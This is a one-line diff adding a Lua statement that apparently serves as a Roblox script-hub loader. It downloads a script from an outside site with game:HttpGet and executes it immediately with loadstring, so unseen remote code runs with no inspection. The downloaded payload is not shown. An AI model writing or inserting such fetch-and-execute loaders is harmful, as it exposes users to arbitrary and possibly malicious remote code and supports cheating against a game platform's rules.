@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://polarhub.xyz/PolarFreeScript/NormalScript.lua"))()
